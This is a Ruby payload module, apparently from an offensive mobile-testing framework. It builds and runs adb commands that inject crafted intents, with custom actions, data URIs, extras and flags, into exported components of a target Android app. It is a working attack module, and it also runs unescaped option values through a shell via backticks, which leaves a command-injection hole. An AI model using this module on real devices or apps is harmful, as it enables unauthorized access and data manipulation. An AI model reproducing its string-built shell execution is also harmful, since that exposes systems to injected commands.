require_relative '../../../core/payload_base'
require 'json'

module MPF
  module Payloads
    module Singles
      module Android
        class IntentInjection < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android Intent Injection',
              module: 'payload/android/singles/intent_injection',
              platform: :android,
              description: 'Injects a crafted intent to target exported component. ' \
                          'Can trigger activities, services, or broadcast receivers with custom data.',
              authors: ['MPF Research Team'],
              severity: 'high'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('TARGET_COMPONENT', 'Target component (activity/service/receiver)', required: true)
            add_option('ACTION', 'Intent action', default: 'android.intent.action.VIEW')
            add_option('DATA_URI', 'Intent data URI', default: '')
            add_option('EXTRAS', 'Intent extras as JSON', default: '{}')
            add_option('FLAGS', 'Intent flags (comma-separated)', default: '')
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
          end

          def generate(opts = {})
            package = get_option('TARGET_PACKAGE')
            component = get_option('TARGET_COMPONENT')
            action = get_option('ACTION')
            data_uri = get_option('DATA_URI')
            extras = get_option('EXTRAS')
            flags = get_option('FLAGS')

            # Build ADB intent command
            cmd = "adb -s #{get_option('DEVICE')} shell am start"
            cmd += " -n #{package}/#{component}"
            cmd += " -a #{action}" unless action.empty?
            cmd += " -d #{data_uri}" unless data_uri.empty?
            
            # Parse and add extras
            begin
              extras_hash = JSON.parse(extras)
              extras_hash.each do |key, value|
                case value
                when String
                  cmd += " --es #{key} '#{value}'"
                when Integer
                  cmd += " --ei #{key} #{value}"
                when TrueClass, FalseClass
                  cmd += " --ez #{key} #{value}"
                end
              end
            rescue JSON::ParserError
              # Skip invalid JSON
            end

            # Add flags
            unless flags.empty?
              flags.split(',').each do |flag|
                cmd += " -f #{flag.strip}"
              end
            end

            {
              type: 'adb_command',
              command: cmd,
              description: 'Intent injection payload',
              impact: 'Triggers exported component with crafted data'
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            payload = generate
            
            print_status("Executing intent injection payload...")
            print_status("Target: #{get_option('TARGET_PACKAGE')}/#{get_option('TARGET_COMPONENT')}")
            
            output = `#{payload[:command]} 2>&1`
            success = $?.success?

            if success
              print_good("Intent delivered successfully")
              {
                success: true,
                output: output,
                payload: payload,
                impact: 'Component triggered - potential for unauthorized access or data manipulation'
              }
            else
              print_error("Intent delivery failed")
              {
                success: false,
                output: output,
                error: 'Failed to deliver intent'
              }
            end
          end

          private

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
